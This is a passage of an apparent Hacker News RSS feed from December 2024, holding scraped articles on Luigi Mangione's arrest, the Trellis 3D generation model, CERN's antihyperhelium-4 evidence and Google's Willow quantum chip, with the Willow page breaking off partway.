Stefano Baghino, Sushain Cherivirala, Tanya Bouman, Ted, thesayyn, Thi Doan, Thomas Weischuh, Tianyu Geng, Timothy Gu, Tomasz Pasternak, UebelAndre, Ulf Adams, Ventzilla, Victor Hiairrassary, Viktor Kustov, Wade Carpenter, Xavier Bonaventura, xinyu.wang, and Yannic Bonenberger.</p>
<p><em>Notice</em>: Bazel installers contain binaries licensed under the GPLv2 with Classpath exception. Those installers should always be redistributed along with the source code.</p>
<p>Some versions of Bazel contain a bundled version of OpenJDK. The license of the bundled OpenJDK and other open-source components can be displayed by running the command <code>bazel license</code>. The vendor and version information of the bundled<br>
OpenJDK can be displayed by running the command <code>bazel info java-runtime</code>. The binaries and source-code of the bundled OpenJDK can be <a href="https://mirror.bazel.build/openjdk/index.html" rel="nofollow">downloaded from our mirror server</a>.</p>
<p><em>Security</em>: All our binaries are signed with our <a href="https://bazel.build/bazel-release.pub.gpg" rel="nofollow">public key</a> 3D5919B448457EE0.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Software developer arrested in connection with murder of healthcare executive (261 pts)]]></title>
            <link>https://www.bbc.com/news/articles/cp9nxee2r0do</link>
            <guid>42370622</guid>
            <pubDate>Mon, 09 Dec 2024 21:17:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/cp9nxee2r0do">https://www.bbc.com/news/articles/cp9nxee2r0do</a>, See on <a href="https://news.ycombinator.com/item?id=42370622">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p data-component="headline-block"><h2>Luigi Mangione: What we know about CEO shooting 'person of interest'<!-- --></h2></p><figure><div data-component="image-block"><p><img src="https://www.bbc.com/bbcx/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/b6bf/live/8a0056e0-b67d-11ef-a0f2-fd81ae5962f4.jpg.webp" alt="Instagram Image taken from social media appears to show  Luigi Mangione"><span>Instagram</span></p></div></figure><div data-component="text-block"><p>A profile is emerging of the privately schooled Ivy League graduate who is being questioned over last week's fatal shooting of United Healthcare's chief executive in New York City.<!-- --></p><p>Police announced on Monday they had arrested Luigi Mangione, 26, on firearms charges after he was recognised by an employee at a McDonald's in Altoona, Pennsylvania. <!-- --></p><p>The Baltimore, Maryland, native had a three-page handwritten document that mentioned grievances with the US healthcare system and indicated the suspect's "motivation and mindset", officials said.<!-- --></p><p>Here's all that we've learned so far about the suspect, whom former classmates have described as a "smart" student. <!-- --></p></div><p data-component="subheadline-block"><h2>'Super normal'<!-- --></h2></p><div data-component="text-block"><p>Mr Mangione was born and raised in Maryland and has ties to San Francisco, California, according to New York Chief of Detectives Joseph Kenny.<!-- --></p><p>He has no prior arrests in New York and his last previous address was in Honolulu, Hawaii, police said. <!-- --></p><p>He attended a private, all-boys high school in Baltimore, called the Gilman School, according to school officials. Mr Mangione was named as the valedictorian, typically the student with the highest academic achievements in a class.<!-- --></p><p>A former classmate, Freddie Leatherbury, told the Associated Press news agency that Mr Mangione came from a wealthy family, even by that private school's standards.<!-- --></p><p>"Quite honestly, he had everything going for him," Mr Leatherbury said.<!-- --></p><p>"He does not seem like the kind of guy to do this based on everything I'd known about him in high school."<!-- --></p><p>Mr Mangione is also a graduate of the University of Pennsylvania, where he received a bachelor's and master's degree in computer science, according to the school, and founded a video game development club. <!-- --></p><p>A friend who attended the Ivy League college at the same time as Mr Mangione described him as a "super normal" and "smart person".<!-- --></p><p>"I would never have expected this," the friend said. <!-- --></p><p>Mr Mangione worked as a data engineer for TrueCar, a digital retailing website for new and used cars, according to his social media profiles. A company spokesman told the BBC he had not worked there since 2023. <!-- --></p><p>According to the LinkedIn profile, Mr Mangione previously worked as a programming intern for Fixarixis, a video game developer. <!-- --></p><p>Mr Mangione comes from a prominent family in the Baltimore area whose businesses include a country club and nursing homes, according to local media. <!-- --></p><p>He is the cousin of Republican state lawmaker Nino Mangione, according to media reports. <!-- --></p></div><p data-component="subheadline-block"><h2>'Ill will towards corporate America'<!-- --></h2></p><div data-component="text-block"><p>Mr Mangione was taken into custody at a McDonald's after an employee spotted him and alerted police. <!-- --></p><p>He was in possession of a so-called ghost gun, a largely untraceable firearm that can be assembled at home using kits, and was probably manufactured on a 3D printer, according to police officials. He also had a suppressor. <!-- --></p><p>Police said he was carrying several IDs, including one with his real identity and another that was fake. These IDs included a US passport and a fraudulent New Jersey ID that was used to check into the New York City hostel, where the suspect was seen before the shooting<!-- --></p><p>Police say he was also found with three pages of handwritten documents in which he seemed to express "ill will towards corporate America".<!-- --></p><p>Investigators revealed that finding the 26-year-old was a complete surprise, and that they did not have his name on a list of suspects prior before Monday.<!-- --></p></div><p data-component="subheadline-block"><h2>What do his social media profiles tell us? <!-- --></h2></p><div data-component="text-block"><p>Social media profiles provide some possible clues about Mr Mangione's thinking. <!-- --></p><p>A person matching his name and photo had an account on Goodreads, a user-generated book review site, where he gave four stars to a text called Industrial Society and Its Future by Theodore Kaczynski – more popularly known as the Unabomber manifesto. <!-- --></p><p>Starting in 1978, Kaczynski carried out a bombing campaign that killed three people and injured dozens of others, until he was arrested in 1996.<!-- --></p><p>In his review, Mr Mangione wrote: "When all other forms of communication fail, violence is necessary to survive. You may not like his methods, but to see things from his perspective, it's not terrorism, it's war and revolution.<!-- --></p><p>"'Violence never solved anything' is a statement uttered by cowards and predators."<!-- --></p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Trellis – 3D mesh generative model (176 pts)]]></title>
            <link>https://trellis3d.github.io/</link>
            <guid>42369476</guid>
            <pubDate>Mon, 09 Dec 2024 19:19:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://trellis3d.github.io/">https://trellis3d.github.io/</a>, See on <a href="https://news.ycombinator.com/item?id=42369476">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
            
            <p><span>Structured 3D Latents</span><br>
                <span>for Scalable and Versatile 3D Generation</span>
            </p>
            
            
            <p><i>* Generated by</i> <span>T</span><span>RELLIS</span>, <i>using its</i> <span>image to 3D assets</span> <i>cabilities.</i>
            </p>
            
            
            <p><b>TL;DR:</b> A native 3D generative model built on a <i><b>unified Structured Latent representation</b></i> and <i><b>Rectified Flow Transformers</b></i>,
                    enabling versatile and high-quality 3D asset creation.
            </p>
            <p>
                We introduce a novel 3D generation method for versatile and high-quality 3D asset creation.
                The cornerstone is a unified Structured LATent (<span>SL</span><span>AT</span>) representation which allows decoding to different output formats, such as Radiance Fields, 3D Gaussians, and meshes.
                This is achieved by integrating a sparsely-populated 3D grid with dense multiview visual features extracted from a powerful vision foundation model,
                comprehensively capturing both structural (geometry) and textural (appearance) information while maintaining flexibility during decoding.<br>
                We employ rectified flow transformers tailored for <span>SL</span><span>AT</span> as our 3D generation models and train models with up to 2 billion parameters on a large 3D asset dataset of 500K diverse objects.
                Our model generates high-quality results with text or image conditions, significantly surpassing existing methods, including recent ones at similar scales.
                 We showcase flexible output format selection and local 3D editing capabilities which were not offered by previous models.
                 Code, model, and data will be released.
            </p>
            <p>
                <i><b>NOTE:</b> The appearance and geometry shown in this page are rendered from 3D Gaussians and meshes, respectively.
                GLB files are extracted by baking appearance from 3D Gaussians to meshes.</i>
            </p>

            <div><p>Generation <span>|</span> Text to 3D Asset</p></div>
            <p>All text prompts are generated by GPT-4. Click on the cards to view extracted GLB files.</p>
            

            <div><p>Generation <span>|</span> Image to 3D Asset</p></div>
            <p>Image prompts are either generated by DALL-E 3 or extracted from SA-1B. Click on the cards to view extracted GLB files.</p>
            

            
            <p>
                <span>T</span><span>RELLIS</span>
                can generates variants of a given 3D asset coherent with given text prompts.
            </p>
            

            <div><p>Editing <span>|</span> Local Manipulation</p></div>
            <p>
                <span>T</span><span>RELLIS</span>
                can manipulate targeted local regions of a given 3D asset according to given text or image prompts.
            </p>
            

            <div><p>Application <span>|</span> 3D Art Designs</p></div>
            <p>
                Compositing the high-quality 3D assets generated by <span>T</span><span>RELLIS</span>,
                complex and vibrant 3D art designs can be created with ease.
            </p>
            

            
            <p>
                <img src="https://trellis3d.github.io/assets/pipeline.png">
            </p>
            <p>
                We introduce Structured LATents (<span>SL</span><span>AT</span>),
                a unified 3D latent representation for high-quality, versatile 3D generation. <span>SL</span><span>AT</span>
                marries sparse structures with powerful visual representations. It defines local latents on active voxels intersecting the object's surface.
                The local latents are encoded by fusing and processing image features from densely rendered views of the 3D asset, while attaches them onto active voxels.
                These features, derived from powerful pretrained vision encoders, capture detailed geometric and visual characteristics, complementing the coarse structure provided by the active voxels.
                Different decoders can then be applied to map <span>SL</span><span>AT</span> to diverse 3D representations of high quality.
            </p>
            <p>
                Building on <span>SL</span><span>AT</span>, we train a family of large 3D generation models, dubbed <span>T</span><span>RELLIS</span>, with text prompts or images as conditions.
                A two stage pipeline is applied which first generates the sparse structure of <span>SL</span><span>AT</span>, followed by generating the latent vectors for non-empty cells.
                We employ rectified flow transformers as our backbone models and adapt them properly to handle the sparsity in <span>SL</span><span>AT</span>.
                We train Trellis with up to 2 billion parameters on a large dataset of carefully-collected 3D assets.
                <span>T</span><span>RELLIS</span> can create high-quality 3D assets with detailed geometry and vivid texture, significantly surpassing previous methods.
                Moreover, it can easily generate 3D assets with different output formats to meet diverse downstream requirements.
            </p>

            
            <p>
                If you find our work useful, please consider citing:
            </p>
            <p>
@article{xiang2024structured,
    title   = {Structured 3D Latents for Scalable and Versatile 3D Generation},
    author  = {Xiang, Jianfeng and Lv, Zelong and Xu, Sicheng and Deng, Yu and Wang, Ruicheng and 
               Zhang, Bowen and Chen, Dong and Tong, Xin and Yang, Jiaolong},
    journal = {arXiv preprint arXiv:2412.01506},
    year    = {2024}
}
            </p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Alice finds first ever evidence of the antimatter partner of hyperhelium-4 (155 pts)]]></title>
            <link>https://home.cern/news/news/physics/alice-finds-first-ever-evidence-antimatter-partner-hyperhelium-4</link>
            <guid>42369294</guid>
            <pubDate>Mon, 09 Dec 2024 19:01:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://home.cern/news/news/physics/alice-finds-first-ever-evidence-antimatter-partner-hyperhelium-4">https://home.cern/news/news/physics/alice-finds-first-ever-evidence-antimatter-partner-hyperhelium-4</a>, See on <a href="https://news.ycombinator.com/item?id=42369294">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
        The finding also represents the first evidence of the heaviest antimatter hypernucleus yet at the LHC
      </p><div>
        <figure id="ALICE-PHO-GEN-2024-010-1"><a href="https://cds.cern.ch/images/ALICE-PHO-GEN-2024-010-1" title="View on CDS"><img alt="ALICE,Event,ALICE General" src="https://cds.cern.ch/images/ALICE-PHO-GEN-2024-010-1/file?size=large"></a><figcaption>Illustration of the production of antihyperhelium-4 (a bound state of two antiprotons, an antineutron and an antilambda) in lead–lead collisions.<span> (Image: Janik Ditzel for the ALICE collaboration)</span></figcaption></figure>
<p>Collisions between heavy ions at the Large Hadron Collider (<a href="https://home.cern/science/accelerators/large-hadron-collider">LHC</a>) create <a href="https://home.cern/science/physics/heavy-ions-and-quark-gluon-plasma">quark–gluon plasma</a>, a hot and dense state of matter that is thought to have filled the Universe around one millionth of a second after the Big Bang. Heavy-ion collisions also create suitable conditions for the production of atomic nuclei and exotic hypernuclei, as well as their <a href="https://home.cern/science/physics/antimatter">antimatter</a> counterparts, antinuclei and antihypernuclei. Measurements of these forms of matter are important for various purposes, including helping to understand the formation of hadrons from the plasma’s constituent quarks and gluons and the <a href="https://home.cern/science/physics/matter-antimatter-asymmetry-problem">matter–antimatter asymmetry</a> seen in the present-day Universe.</p>

<p>Hypernuclei are exotic nuclei formed by a mix of protons, neutrons and hyperons, the latter being unstable particles containing one or more quarks of the strange type. More than 70 years since their discovery in <a href="https://home.cern/science/physics/cosmic-rays-particles-outer-space">cosmic rays</a>, hypernuclei remain a source of fascination for physicists because they are rarely found in nature and it’s challenging to create and study them in the laboratory.</p>

<p>In heavy-ion collisions, hypernuclei are created in significant quantities, but until recently only the lightest hypernucleus, <a href="https://doi.org/10.1007/BF02782920">hypertriton</a>, and its antimatter partner, <a href="https://www.science.org/doi/full/10.1126/science.1183980#body-ref-R5">antihypertriton</a>, have been observed. A hypertriton is composed of a proton, a neutron and a lambda (a hyperon containing one strange quark). An antihypertriton is made up of an antiproton, an antineutron and an antilambda.</p>

<p>Following hot on the heels of an <a href="https://www.nature.com/articles/s41586-024-07823-0">observation</a> of antihyperhydrogen-4 (a bound state of an antiproton, two antineutrons and an antilambda), reported earlier this year by the STAR collaboration at the Relativistic Heavy Ion Collider&nbsp;(<a href="https://www.bnl.gov/rhic/">RHIC</a>), the ALICE collaboration at the LHC has now seen the first ever <a href="https://arxiv.org/abs/2410.17769">evidence</a> of antihyperhelium-4, which is composed of twoantiprotons, an antineutron and an antilambda. The result has a significance of 3.5 <a href="https://home.cern/resources/faqs/five-sigma">standard deviations</a> and also represents the first evidence of the heaviest antimatter hypernucleus yet at the LHC.</p>

<p>The ALICE measurement is based on lead–lead collision data taken in 2018 at an energy of 5.02 teraelectronvolts (TeV) for each colliding pair of nucleons (protons and neutrons). Using a machine-learning technique that outperforms conventional hypernuclei search techniques, the ALICE researchers looked at the data for signals of hyperhydrogen-4, hyperhelium-4 and their antimatter partners. Candidates for (anti)hyperhydrogen-4 were identified by looking for the (anti)helium-4 nucleus and the charged pion into which it decays, whereas candidates for (anti)hyperhelium-4 were identified via its decay into an (anti)helium-3 nucleus, an (anti)proton and a charged pion.</p>

<p>In addition to finding evidence of antihyperhelium-4 with a significance of 3.5 standard deviations, as well as evidence of antihyperhydrogen-4 with a significance of 4.5 standard deviations, the ALICE team measured the production yields and masses of both hypernuclei.</p>

<p>For both hypernuclei, the measured masses are compatible with the current <a href="https://hypernuclei.kph.uni-mainz.de/">world-average values</a>. The measured production yields were compared with predictions from the statistical hadronisation model, which provides a good description of the formation of hadrons and nuclei in heavy-ion collisions. This comparison shows that the model’s predictions agree closely with the data if both excited hypernuclear states and ground states are included in the predictions. The results confirm that the statistical hadronisation model can also provide a good description of the production of hypernuclei, which are compact objects with sizes of around 2 femtometres (1 femtometre&nbsp;is 10<sup>-15</sup> metres).</p>

<p>The researchers also determined the antiparticle-to-particle yield ratios for both hypernuclei and found that they agree with unity within the experimental uncertainties. This agreement is consistent with <a href="https://cerncourier.com/a/balancing-matter-and-antimatter-in-pb-pb-collisions/">ALICE’s observation</a> of the equal production of matter and antimatter at LHC energies and adds to the ongoing research into the matter–antimatter imbalance in the Universe.</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenAI: Sora (722 pts)]]></title>
            <link>https://sora.com/</link>
            <guid>42368604</guid>
            <pubDate>Mon, 09 Dec 2024 18:02:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sora.com/">https://sora.com/</a>, See on <a href="https://news.ycombinator.com/item?id=42368604">Hacker News</a></p>
Couldn't get https://sora.com/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Willow, Our Quantum Chip (724 pts)]]></title>
            <link>https://blog.google/technology/research/google-willow-quantum-chip/</link>
            <guid>42367649</guid>
            <pubDate>Mon, 09 Dec 2024 16:28:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/research/google-willow-quantum-chip/">https://blog.google/technology/research/google-willow-quantum-chip/</a>, See on <a href="https://news.ycombinator.com/item?id=42367649">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    
    





    

    
      

<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
  }">
  
  <div>
      <div>
          
            <p>Dec 09, 2024</p>
          
          
            <p data-reading-time-render="">[[read-time]] min read</p>
          
        </div>
      
        <p>
          Our new chip demonstrates error correction and performance that paves the way to a useful, large-scale quantum computer
        </p>
      
    </div>
  
  <div data-component="uni-ai-generated-summary" data-analytics-module="{
    &quot;event&quot;: &quot;module_impression&quot;,
    &quot;module_name&quot;: &quot;ai_summary&quot;,
    &quot;section_header&quot;: &quot;CTA&quot;
  }">
      
        <div data-summary-id="ai_summary_1">
          <h2>General summary</h2>
          <p>Google has developed a new quantum chip called Willow, which significantly reduces errors as it scales up, a major breakthrough in quantum error correction. Willow also performed a computation in under five minutes that would take a supercomputer 10 septillion years, demonstrating its potential for solving complex problems beyond the reach of classical computers. This achievement marks a significant step towards building commercially relevant quantum computers that can revolutionize fields like medicine, energy, and AI.</p>
          
          <p><small>
            Summaries were generated by Google AI. Generative AI is experimental.
          </small>
        </p></div>
      
        <div data-summary-id="ai_summary_2">
          <h2>Bullet points</h2>
          <ul>
<li>Google's new quantum chip, Willow, is a major step towards building a useful, large-scale quantum computer.</li>
<li>Willow reduces errors exponentially as it scales up, achieving a breakthrough in quantum error correction.</li>
<li>Willow performed a benchmark computation in under five minutes that would take a supercomputer 10 septillion years.</li>
<li>Willow's performance is a sign that useful, very large quantum computers can be built.</li>
<li>Google is working on developing quantum algorithms that can solve real-world problems.</li>
</ul>
          
          <p><small>
            Summaries were generated by Google AI. Generative AI is experimental.
          </small>
        </p></div>
      

      
      <div>
        <h4>
          Explore other styles:
        </h4>
        
      </div>
      

      </div>
</div>

    

    
      <div>
      <p>
        <video autoplay="" muted="" loop="" playsinline="" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/05_Hero_Shot.mp4" title="mp4 showing an illustration of the coast of California behind a quantum chip and the phrase &quot;willow&quot;" poster="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_images/02_Blog_Header_-_Hero_Shot_2096x1182.png">
          Sorry, your browser doesn't support embedded videos, but don't worry, you can
            <a href="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/05_Hero_Shot.mp4">download it</a>
            and watch it with your favorite video player!
        </video>
      </p>
      
    </div>

    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
              


<google-read-aloud-player data-analytics-module="{
        &quot;event&quot;: &quot;module_impression&quot;,
        &quot;module_name&quot;: &quot;ai_audio&quot;,
        &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
    }" data-date-modified="2024-12-09T17:19:24.610489+00:00" data-progress-bar-style="half-wave" data-api-key="AIzaSyBLT6VkYe-x7sWLZI2Ep26-fNkBKgND-Ac" data-article-style="style9" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-layout-style="style1" data-highlight-mode="word-over-paragraph" data-highlight-text-color="#000000" data-highlight-word-background="#8AB4F8" data-highlight-paragraph-background="#D2E3FC" data-background="linear-gradient(180deg, #F1F3F4 0%, #F8F9FA 100%)" data-foreground-color="#202124" data-font="600 16px Google Sans, sans-serif" data-box-shadow="0px 1px 3px 1px rgba(60, 64, 67, 0.15)">
</google-read-aloud-player>




            

            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }"><p data-block-key="cd6ib">Today I’m delighted to announce Willow, our latest quantum chip. Willow has state-of-the-art performance across a number of metrics, enabling two major achievements.</p><ul><li data-block-key="61h6o">The first is that Willow can reduce errors exponentially as we scale up using <i>more</i> qubits. This cracks a key challenge in quantum error correction that the field has pursued for almost 30 years.</li><li data-block-key="eaamq">Second, Willow performed a standard benchmark computation in under five minutes that would take one of today’s <a href="https://www.olcf.ornl.gov/frontier/">fastest supercomputers</a> 10 septillion (that is, 10<sup>25</sup>) years — a number that vastly exceeds the age of the Universe.</li></ul><p data-block-key="aklre">The Willow chip is a major step on a journey that began over 10 years ago. When I founded Google Quantum AI in 2012, the vision was to build a useful, large-scale quantum computer that could harness quantum mechanics — the “operating system” of nature to the extent we know it today — to benefit society by advancing scientific discovery, developing <a href="https://quantumai.google/applications">helpful applications</a>, and tackling some of society's greatest challenges. As part of Google Research, our team has charted a long-term <a href="https://quantumai.google/roadmap">roadmap</a>, and Willow moves us significantly along that path towards commercially relevant applications.</p></div>
  

  
    
  
    


  <div data-component="uni-article-yt-player" data-page-title="Meet Willow, our state-of-the-art quantum chip" data-video-id="W7ppd_RY-UE" data-index-id="2" data-type="video" data-analytics-module="{
      &quot;module_name&quot;: &quot;Youtube Video&quot;,
      &quot;section_header&quot;: &quot;undefined&quot;
    }" data-yt-video="module">

      

      <a role="video" tabindex="0">
        <div>
          
            
            
            
            <p><img alt="image linking to a YouTube video showing a person on a stage with a screen reading &quot;Willow's Superconducting Qubits&quot;" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/GoogleQuantumAI_WillowFilm_Thumbn.width-100.format-webp.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/GoogleQuantumAI_WillowFilm_Thumbn.width-500.format-webp.webp&quot;,
                  &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/GoogleQuantumAI_WillowFilm_Thumb.width-1000.format-webp.webp&quot;
                }"></p>

          
          <svg role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241203-1753#mi-keyboard-arrow-right"></use>
</svg>


          <svg role="presentation">
            
            <use href="/static/blogv2/images/icons.svg?version=pr20241203-1753#yt_video_play_button_no_hole"></use>
            
          </svg>
          <svg role="img">
            
            <use href="/static/blogv2/images/icons.svg?version=pr20241203-1753#yt_video_play_button"></use>
            
          </svg>

          
          
          
          
        </div>
      </a>

      
        <p>A video with Director of Quantum Hardware Julian Kelly introducing Willow and its breakthrough achievements</p>
      

      
    </div>


  


  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }"><h2 data-block-key="cd6ib">Exponential quantum error correction — below threshold!</h2><p data-block-key="2vrg2">Errors are one of the greatest challenges in quantum computing, since qubits, the units of computation in quantum computers, have a tendency to rapidly exchange information with their environment, making it difficult to protect the information needed to complete a computation. Typically the more qubits you use, the more errors will occur, and the system becomes classical.</p><p data-block-key="2inmn">Today in <a href="https://www.nature.com/articles/s41586-024-08449-y">Nature</a>, we published results showing that <a href="https://research.google/blog/making-quantum-error-correction-work/"><b>the more qubits we use in Willow, the more we</b> <b><i>reduce</i></b><b> errors</b></a><b>, and the more quantum the system becomes</b>. We tested ever-larger arrays of physical qubits, scaling up from a grid of 3x3 encoded qubits, to a grid of 5x5, to a grid of 7x7 — and each time, using our latest advances in quantum error correction, we were able to cut the error rate in half. In other words, we achieved an exponential reduction in the error rate. This historic accomplishment is known in the field as “below threshold” — being able to drive errors down while scaling up the number of qubits. You must demonstrate being below threshold to show real progress on error correction, and this has been an outstanding challenge since <a href="https://journals.aps.org/pra/abstract/10.1103/PhysRevA.52.R2493">quantum error correction</a> was introduced by Peter Shor in 1995.</p><p data-block-key="ce88l">There are other scientific “firsts” involved in this result as well. For example, it’s also one of the first compelling examples of real-time error correction on a superconducting quantum system — crucial for any useful computation, because if you can’t correct errors fast enough, they ruin your computation before it’s done. And it’s a "beyond breakeven" demonstration, where our arrays of qubits have longer lifetimes than the individual physical qubits do, an unfakable sign that error correction is improving the system overall.</p><p data-block-key="d0fr2">As the first system below threshold, this is the most convincing prototype for a scalable logical qubit built to date. It’s a strong sign that useful, very large quantum computers can indeed be built. Willow brings us closer to running practical, commercially-relevant algorithms that can’t be replicated on conventional computers.</p><h2 data-block-key="ftphp">10 septillion years on one of today’s fastest supercomputers</h2><p data-block-key="qbvk">As a measure of Willow’s performance, we used the <a href="https://research.google/blog/validating-random-circuit-sampling-as-a-benchmark-for-measuring-quantum-progress/">random circuit sampling (RCS) benchmark</a>. Pioneered by our team and now widely used as a standard in the field, RCS is the classically hardest benchmark that can be done on a quantum computer today. You can think of this as an entry point for quantum computing — it checks whether a quantum computer is doing something that couldn’t be done on a classical computer. Any team building a quantum computer should check first if it can beat classical computers on RCS; otherwise there is strong reason for skepticism that it can tackle more complex quantum tasks. We’ve consistently used this benchmark to assess progress from one generation of chip to the next — we reported Sycamore results in <a href="https://blog.google/technology/ai/what-our-quantum-computing-milestone-means/">October 2019</a> and again recently in <a href="https://www.nature.com/articles/s41586-024-07998-6">October 2024</a>.</p><p data-block-key="66o0h">Willow’s performance on this benchmark is astonishing: It performed a computation in under five minutes that would take one of today’s <a href="https://www.olcf.ornl.gov/frontier/">fastest supercomputers</a> 10<sup>25</sup> or 10 septillion years. If you want to write it out, it’s 10,000,000,000,000,000,000,000,000 years. This mind-boggling number exceeds known timescales in physics and vastly exceeds the age of the universe. It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a <a href="https://en.wikipedia.org/wiki/The_Fabric_of_Reality">prediction</a> first made by David Deutsch.</p><p data-block-key="9o736">These latest results for Willow, as shown in the plot below, are our best so far, but we’ll continue to make progress.</p></div>
  

  
    







  
    
        <div data-analytics-module="{
            &quot;module_name&quot;: &quot;Inline Images&quot;,
            &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
          }">
    

    <p><img alt="A chart comparing the performance of different quantum computing platforms, on the task of random circuit sampling (RCS)." src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig1.width-100.format-webp.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig1.width-500.format-webp.webp&quot;,
                  &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig1.width-1000.format-webp.webp&quot;
                }">
          
        
      
      </p>
      
        <figcaption><p data-block-key="bq2yd">Computational costs are heavily influenced by available memory. Our estimates therefore consider a range of scenarios, from an ideal situation with unlimited memory (▲) to a more practical, embarrassingly parallelizable implementation on GPUs (⬤).</p></figcaption>
      
    
      </div>
    
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }">
        <p data-block-key="r29ro">Our assessment of how Willow outpaces one of the world’s most powerful classical supercomputers, <a href="https://www.olcf.ornl.gov/frontier/">Frontier</a>, was based on conservative assumptions. For example, we assumed full access to secondary storage, i.e., hard drives, without any bandwidth overhead — a generous and unrealistic allowance for Frontier. Of course, as happened after we announced the first <a href="https://blog.google/technology/ai/what-our-quantum-computing-milestone-means/">beyond-classical computation in 2019</a>, we expect classical computers to keep improving on this benchmark, but the rapidly growing gap shows that quantum processors are peeling away at a double exponential rate and will continue to vastly outperform classical computers as we scale up.</p>
      </div>
  

  
    
  
    


  <div data-component="uni-article-yt-player" data-page-title="Meet Willow, our state-of-the-art quantum chip" data-video-id="l_KrC1mzd0g" data-index-id="6" data-type="video" data-analytics-module="{
      &quot;module_name&quot;: &quot;Youtube Video&quot;,
      &quot;section_header&quot;: &quot;undefined&quot;
    }" data-yt-video="module">

      

      <a role="video" tabindex="0">
        <div>
          
            
            <p><img alt="A video discussion with Principle Scientist Sergio Boixo, Founder and Lead Hartmut Neven, and physicist John Preskill on using random circuit sampling as a benchmark to demonstrate beyond-classical performance in quantum computers." src="https://i.ytimg.com/vi_webp/l_KrC1mzd0g/default.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;//i.ytimg.com/vi_webp/l_KrC1mzd0g/sddefault.webp&quot;,
                  &quot;desktop&quot;: &quot;https://i.ytimg.com/vi_webp/l_KrC1mzd0g/maxresdefault.webp&quot;
                }"></p>

          
          <svg role="presentation">
  <use xmlns:xlink="http://www.w3.org/1999/xlink" href="/static/blogv2/images/icons.svg?version=pr20241203-1753#mi-keyboard-arrow-right"></use>
</svg>


          <svg role="presentation">
            
            <use href="/static/blogv2/images/icons.svg?version=pr20241203-1753#yt_video_play_button_no_hole"></use>
            
          </svg>
          <svg role="img">
            
            <use href="/static/blogv2/images/icons.svg?version=pr20241203-1753#yt_video_play_button"></use>
            
          </svg>

          
          
          
          
        </div>
      </a>

      
        <p>A video with Principal Scientist Sergio Boixo, Founder and Lead Hartmut Neven, and renowned physicist John Preskill discussing random circuit sampling, a benchmark that demonstrates beyond-classical performance in quantum computers.</p>
      

      
    </div>


  


  

  
